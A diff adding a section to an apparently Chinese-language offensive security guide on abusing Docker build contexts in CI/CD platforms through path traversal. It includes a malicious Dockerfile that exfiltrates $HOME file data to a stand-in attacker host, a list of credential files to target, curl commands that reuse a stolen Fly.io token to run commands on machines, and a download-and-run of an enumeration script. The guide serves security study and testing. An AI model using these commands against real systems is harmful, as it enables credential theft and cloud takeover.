@@ -500,3 +500,83 @@ curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deep
 chmod +x /tmp/deepce.sh
 /tmp/deepce.sh
 ```
+
+## 12. Docker Build Context 滥用
+
+在 CI/CD 平台或托管构建服务中，如果允许用户指定 Docker 构建上下文路径（build context），攻击者可以通过路径穿越读取构建主机上的敏感文件。
+
+### 12.1 原理
+
+Docker 构建时需要指定两个路径：
+- **build context**：发送给 Docker daemon 的目录（daemon 可以 COPY 其中的文件）
+- **Dockerfile 路径**：相对于 context 的 Dockerfile 位置
+
+如果平台未对 context 路径做规范化（canonicalize）和限制，攻击者可以将 context 设为 `..`（父目录），导致构建用户 `$HOME` 下的所有文件都变为可 COPY 的内容。
+
+### 12.2 路径穿越示例
+
+恶意的构建配置文件（如 render.yaml、fly.toml 等）：
+```yaml
+runtime: "container"
+build:
+  dockerfile: "test/Dockerfile"     # Dockerfile 必须在 context 内
+  dockerBuildPath: ".."             # 路径穿越 → 构建用户的 $HOME
+```
+
+对应的恶意 Dockerfile：
+```dockerfile
+FROM alpine
+RUN apk add --no-cache curl
+RUN mkdir /data
+COPY . /data                        # 复制整个 build context（现在是 $HOME）
+RUN curl -si https://attacker.tld/?d=$(find /data -type f | base64 -w 0)
+```
+
+### 12.3 常见泄露目标
+
+从构建主机的 `$HOME` 中可能窃取的高价值文件：
+
+| 文件路径 | 内容 |
+|---------|------|
+| `~/.docker/config.json` | 容器镜像仓库认证 Token |
+| `~/.kube/config` | K8s 集群凭据 |
+| `~/.aws/credentials` | AWS IAM 凭据 |
+| `~/.config/gcloud/` | GCP 凭据 |
+| `~/.ssh/id_rsa` | SSH 私钥 |
+| `~/.env` / `.env` | 环境变量配置 |
+| `~/.fly/config.yml` | Fly.io 等 PaaS 凭据 |
+
+### 12.4 Token 横向利用（Cloud Pivot）
+
+某些平台使用同一个 Token 同时认证容器镜像仓库和控制平面 API。窃取的镜像仓库 Token 可能直接用于管理 API：
+
+```bash
+# 示例：窃取的 Token 用于 Fly.io Machines API
+# 枚举组织内所有应用
+curl -H "Authorization: Bearer fm2_..." \
+  "https://api.machines.dev/v1/apps?org_slug=TARGET_ORG"
+
+# 在任意应用的机器上执行命令
+curl -s -X POST -H "Authorization: Bearer fm2_..." \
+  "https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
+  --data '{"command":["id"],"timeout":5}'
+```
+
+### 12.5 .dockerignore 不可靠
+
+即使项目中有 `.dockerignore` 文件，如果平台在处理 context 路径时**先复制目录到 daemon 再应用 .dockerignore**，宿主机文件仍然会被暴露。`.dockerignore` 只影响 COPY/ADD 指令，不影响 build context 的发送阶段。
+
+### 12.6 多阶段构建 Secret 泄露
+
+多阶段构建（multi-stage build）中，如果中间阶段使用了 secret 挂载但最终阶段仍可访问构建缓存：
+```dockerfile
+# 第一阶段：挂载 secret 构建
+FROM golang:1.21 AS builder
+RUN --mount=type=secret,id=github_token \
+    GITHUB_TOKEN=$(cat /run/secrets/github_token) go build ...
+
+# 如果构建缓存未清理，层缓存中可能残留 secret
+# 或者如果 builder 阶段产物中包含了嵌入的 token
+```
+
+防护：使用 BuildKit `--mount=type=secret` 时确保 secret 只在 RUN 指令执行期间可用，不写入文件系统层。
